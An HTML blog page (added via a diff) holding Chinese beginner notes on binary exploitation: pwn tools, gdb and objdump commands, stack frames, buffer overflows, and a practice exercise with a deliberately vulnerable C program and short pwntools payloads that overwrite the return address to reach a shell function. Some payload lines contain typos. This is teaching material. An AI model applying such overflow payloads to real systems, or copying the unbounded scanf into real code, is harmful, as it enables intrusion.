@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="技术交流">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="余枫洁">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="blog5"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="技术交流" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="computer language"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>blog5 - computer language</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/article">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2018/07/09/blog5/">
+                blog5
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-07-09</span>
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>511<br><a id="more"></a></p>
+<h1 id="linux下常用的pwn工具"><a href="#linux下常用的pwn工具" class="headerlink" title="linux下常用的pwn工具"></a>linux下常用的pwn工具</h1><p>gdb：Linux调试中必要用到的<br>gdb-peda：gdb方便调试的工具，类似的工具有gef，gdbinit，这些工具的安装可以参考：<a href="http://blog.csdn.net/gatieme/article/details/63254211" target="_blank" rel="noopener">http://blog.csdn.net/gatieme/article/details/63254211</a><br>pwntools:写exp和poc的利器<br>checksec：可以很方便的知道elf程序的安全性和程序的运行平台<br>objdump和readelf：可以很快的知道elf程序中的关键信息<br>ida pro ：强大的反编译工具<br>ROPgadget：强大的rop利用工具<br>one_gadget：可以快速的寻找libc中的调用exec(‘bin/sh’)的位置<br>libc-database： 可以通过泄露的libc的某个函数地址查出远程系统是用的哪个libc版本<br><a href="http://https://www.cnblogs.com/HacTF/p/8052175.html" target="_blank" rel="noopener">http://https://www.cnblogs.com/HacTF/p/8052175.html</a></p>
+<p>#　gdb常用指令:<br>gcc -g  main.c                      //在目标文件加入源代码的信息<br>gdb a.out       </p>
+<p>(gdb) start                         //开始调试<br>(gdb) n                             //一条一条执行<br>(gdb) step/s                        //执行下一条，如果函数进入函数<br>(gdb) backtrace/bt                  //查看函数调用栈帧<br>(gdb) info/i locals                 //查看当前栈帧局部变量<br>(gdb) frame/f                       //选择栈帧，再查看局部变量<br>(gdb) print/p                       //打印变量的值<br>(gdb) finish                        //运行到当前函数返回<br>(gdb) set var sum=0                 //修改变量值<br>(gdb) list/l 行号或函数名             //列出源码<br>(gdb) display/undisplay sum         //每次停下显示变量的值/取消跟踪<br>(gdb) break/b  行号或函数名           //设置断点<br>(gdb) continue/c                    //连续运行<br>(gdb) info/i breakpoints            //查看已经设置的断点<br>(gdb) delete breakpoints 2          //删除某个断点<br>(gdb) disable/enable breakpoints 3  //禁用/启用某个断点<br>(gdb) break 9 if sum != 0           //满足条件才激活断点<br>(gdb) run/r                         //重新从程序开头连续执行<br>(gdb) watch input[4]                //设置观察点<br>(gdb) info/i watchpoints            //查看设置的观察点<br>(gdb) x/7b input                    //打印存储器内容，b–每个字节一组，7–7组<br>(gdb) disassemble                   //反汇编当前函数或指定函数<br>(gdb) si                            // 一条指令一条指令调试 而 s 是一行一行代码<br>(gdb) info registers                // 显示所有寄存器的当前值<br>(gdb) x/20 $esp                    //查看内存中开始的20个数<br>＃　objdump常用指令：<br>–archive-headers<br>-a<br>显示档案库的成员信息,类似ls -l将lib*.a的信息列出。 </p>
+<p>-b bfdname<br>–target=bfdname<br>指定目标码格式。这不是必须的，objdump能自动识别许多格式，比如： </p>
+<p>objdump -b oasys -m vax -h fu.o<br>显示fu.o的头部摘要信息，明确指出该文件是Vax系统下用Oasys编译器生成的目标文件。objdump -i将给出这里可以指定的目标码格式列表。 </p>
+<p>-C<br>–demangle<br>将底层的符号名解码成用户级名字，除了去掉所开头的下划线之外，还使得C++函数名以可理解的方式显示出来。 </p>
+<p>–debugging<br>-g<br>显示调试信息。企图解析保存在文件中的调试信息并以C语言的语法显示出来。仅仅支持某些类型的调试信息。有些其他的格式被readelf -w支持。 </p>
+<p>-e<br>–debugging-tags<br>类似-g选项，但是生成的信息是和ctags工具相兼容的格式。 </p>
+<p>–disassemble<br>-d<br>从objfile中反汇编那些特定指令机器码的section。 </p>
+<p>-D<br>–disassemble-all<br>与 -d 类似，但反汇编所有section. </p>
+<p>–prefix-addresses<br>反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式。 </p>
+<p>-EB<br>-EL<br>–endian={big|little}<br>指定目标文件的小端。这个项将影响反汇编出来的指令。在反汇编的文件没描述小端信息的时候用。例如S-records. </p>
+<p>-f<br>–file-headers<br>显示objfile中每个文件的整体头部摘要信息。 </p>
+<p>-h<br>–section-headers<br>–headers<br>显示目标文件各个section的头部摘要信息。 </p>
+<p>-H<br>–help<br>简短的帮助信息。 </p>
+<p>-i<br>–info<br>显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 </p>
+<p>-j name<br>–section=name<br>仅仅显示指定名称为name的section的信息 </p>
+<p>-l<br>–line-numbers<br>用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用使用-ld和使用-d的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。 </p>
+<p>-m machine<br>–architecture=machine<br>指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如S-records)，这个选项很有用。可以用-i选项列出这里能够指定的架构. </p>
+<p>–reloc<br>-r<br>显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。 </p>
+<p>–dynamic-reloc<br>-R<br>显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。 </p>
+<p>-s<br>–full-contents<br>显示指定section的完整内容。默认所有的非空section都会被显示。 </p>
+<p>-S<br>–source<br>尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。 </p>
+<p>–show-raw-insn<br>反汇编的时候，显示每条汇编指令对应的机器码，如不指定–prefix-addresses，这将是缺省选项。 </p>
+<p>–no-show-raw-insn<br>反汇编时，不显示汇编指令的机器码，如不指定–prefix-addresses，这将是缺省选项。 </p>
+<p>–start-address=address<br>从指定地址开始显示数据，该选项影响-d、-r和-s选项的输出。 </p>
+<p>–stop-address=address<br>显示数据直到指定地址为止，该项影响-d、-r和-s选项的输出。 </p>
+<p>-t<br>–syms<br>显示文件的符号表入口。类似于nm -s提供的信息 </p>
+<p>-T<br>–dynamic-syms<br>显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。它显示的信息类似于 nm -D|–dynamic 显示的信息。 </p>
+<p>-V<br>–version<br>版本信息 </p>
+<p>–all-headers<br>-x<br>显示所可用的头信息，包括符号表、重定位入口。-x 等价于-a -f -h -r -t 同时指定。 </p>
+<p>-z<br>–disassemble-zeroes<br>一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编。 </p>
+<p>@file 可以将选项集中到一个文件中，然后使用这个@file选项载入。<br>＃　栈帧平衡<br>基础知识备用：<br><img src="https://i.imgur.com/nXOv1Ku.png" alt=""><br>＃＃＃　栈帧结构图</p>
+<p>栈帧的定义：栈帧（stack  frame）：简单来讲，栈帧就是函数运行的环境。每个函数在被调用时都会在栈区形成一个叫栈帧的结构，这个结构中保存了函数参数、函数的局部变量、函数执行完后返回到哪里等等一些数据<br>栈帧的作用：传递过程参数；存储返回信息；保存寄存器内容用于以后恢复；本地存储。<br>栈底指针（帧指针）：ebp寄存器。<br>栈顶指针（栈指针）：esp寄存器。<br>栈的生长方向：向低地址方向增长。</p>
+<p>调用者的栈帧存储内容：<br>A:被调用者的参数。<br>B:调用者的返回地址。</p>
+<p>被调用者的栈帧存储内容是：<br>A:从保存ebp的值开始的。<br>在被调用过程中第一个参数的位置放在相对于ebp偏移量为8的位置处。(先存储参数，再存储返回地址，最后是ebp的值，返回地址是四个字节，参数是四个字节)。</p>
+<p>call的作用：(函数调用时)<br>A：将返回地址入栈。<br>B：跳转到被调用函数过程的起始过程。<br>函数调用过程：<br><img src="https://i.imgur.com/NfUOg09.png" alt=""><br>＃　缓冲区溢出<br>缓冲区溢出漏洞是程序由于缺乏对缓冲区边界条件检查而引起的一种异常行为，通常是程序向缓冲区中写数据，但内容超过了程序员设定的缓冲区边界，从而覆盖了相邻的内存区域，造成覆盖程序中的其他变量甚至影响控制流的敏感数据，造成程序的非预期行为。<br>eg:<br><img src="https://i.imgur.com/zrI3MdT.png" alt=""></p>
+<p>如图所示，在内存中保存了相邻的两个变量，A是char[]字符串类型，作为缓冲区用于存储外部输入的字符串，长度为8Byte，而B是短整数型。在程序执行时，某指令向A中写入了长度大于8的字符串，超过了A的边界覆盖了B的内容，造成B的值被改变。A中写入的字符串是”abcdefghi”，长度为9，加上结束符’\0’之后修改B的值，从原先的0xffff变成0x0069。</p>
+<p>根据缓冲区溢出的内存位置不同，将缓冲区溢出又分为栈溢出和堆溢出。</p>
+<p>１.栈溢出<br>程序执行过程的栈，是由OS创建与维护的，同时也支持了程序内的函数调用功能。在进行函数调用时，程序会将返回地址压入栈中，而执行完被调用函数代码之后，则会通过ret指令从栈中弹出返回地址，装载到EIP指令寄存器，从而继续程序的运行。<br>栈溢出发生在程序向位于栈中的内存地址写数据时，当写入的数据长度超过栈分配给缓冲区的空间时，就会造成栈溢出。攻击者可以有几种方式来利用这种漏洞：<br>（1）覆盖缓冲区附近的程序变量，改变程序的执行流程和结束，从而达到攻击者的目的。<br>（2）覆盖栈中保存的函数返回地址，修改为攻击者指定的地址，当程序返回时，程序流程将跳转到攻击者指定地址，理想情况下可以执行任意代码。<br>（3）覆盖某个函数指针或程序异常处理结构，只要溢出之后目标函数或异常处理程序被执行，同样可以让程序跳转到任意地址。</p>
+<p>２.堆溢出<br>堆是程序运行时动态分配的内存，用户一般通过malloc、new等函数申请内存，通过返回的起始地址指针对分配的内存进行操作，使用完之后要通过free、delete等函数释放这部分内存，否则会造成内存泄露。堆的操作分为分配、释放、合并三种，因为堆在内存中的位置不固定，大小比较自由，多次申请、释放后可能会更加凌乱，系统从性能、空间利用率还有越来越受重视的安全角度出发来管理堆，具体实现比较复杂。这里介绍最常见的空闲堆块操作引起的堆缓冲区溢出。同一个堆中的堆块在内存中通常是连续的，由此很可能发生的状况是：在向一个已分配堆块中写入数据时，由于数据长度超出了该堆块的大小，导致数据溢出覆盖堆块后方的相邻空闲堆块。我们不能保证每次安全漏洞的利用都是成功的，即使程序中真实存在着安全漏洞。这是因为OS的内存管理机制非常复杂，且不受攻击者的控制和了解，从而使得内存、寄存器的内容、参与利用的代码块地址经常动态变化且出乎攻击者意料，导致溢出攻击成功具有一定概率。</p>
+<p>＃　ｐｗｎ基础练习题<br>源代码<br>‘’’</p>
+<p>   #include &lt;stdio.h&gt;</p>
+<p>#include &lt;stdlib.h&gt;</p>
+<p>#include &lt;unistd.h&gt;<br>void cmd()<br>{<br>    system(“sh”);<br>}<br>void A()<br>{<br>    char a[100];<br>    scanf(“%s”,a);<br>    return;<br>}<br>int main(){<br>    A();<br>}<br>‘’’</p>
+<p>根据源代码可知该程序调用Ａ函数时，在scanf中没有对字符串的长度做限制，即存在缓冲区溢出。所以解决本题的思路是将ret的地址修改为cmd()函数的地址，直接跳转到该函数后get shell.<br><img src="https://i.imgur.com/SDt4SjI.png" alt=""><br>打开gdb调试函数，输入gdb p1和start<br><img src="https://i.imgur.com/FbMCXz3.png" alt=""><br>输入pattc 200创建200个字符，在输入run和粘贴这些字符<br><img src="https://i.imgur.com/Bawt6h7.png" alt=""><br>得到程序奔溃的地址<br><img src="https://i.imgur.com/Jr3dSCU.png" alt=""><br>输入patto与出错地址，执行得到偏移量<br><img src="https://i.imgur.com/YjPM9U0.png" alt=""><br>打开objdump,输入objdump -d p1，将程序的汇编代码复制粘贴到空白文件中，ctrl+f找到cmd()的地址<br><img src="https://i.imgur.com/wnx3br2.png" alt=""><br>打开python，编写payload,获得shell<br>payload:<br>    <code>payload=&quot;a&quot;*112+“\x6b\x84\x04\x08&quot;
+     p=process=(&quot;./p1&quot;)
+     p.sendline(payload)
+     p.interactive();</code></p>
+<h2 id="RET-slide"><a href="#RET-slide" class="headerlink" title="RET_slide"></a>RET_slide</h2><p>即是：在不知道返回地址偏移时，通过Ret_slide设置payload减少尝试次数，即RET前的字符串利用其他RET地址来填充。</p>
+<blockquote>
+<p>payload：<br>from pwn import <em><br>payload = “\x08\x04\x84\xe3” </em> 28 + “\x6b\x84\x04\x08”<br>p = process(“./p1”)<br>p.sendline(payload)<br>p.interactive()</p>
+</blockquote>
+<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>大佬解题过程：<a href="http://https://qianfei11.github.io/2018/07/07/BIN集训（四）/#缓冲区溢出（Buffer-Overflow）" target="_blank" rel="noopener">http://https://qianfei11.github.io/2018/07/07/BIN集训（四）/#缓冲区溢出（Buffer-Overflow）</a></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/PWN/">#PWN</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2018/07/09/blog5/">blog5</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2018/07/04/blog4/">blog4</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2018/07/03/blog3/">blog3</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2018/07/03/blog2/">blog2</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
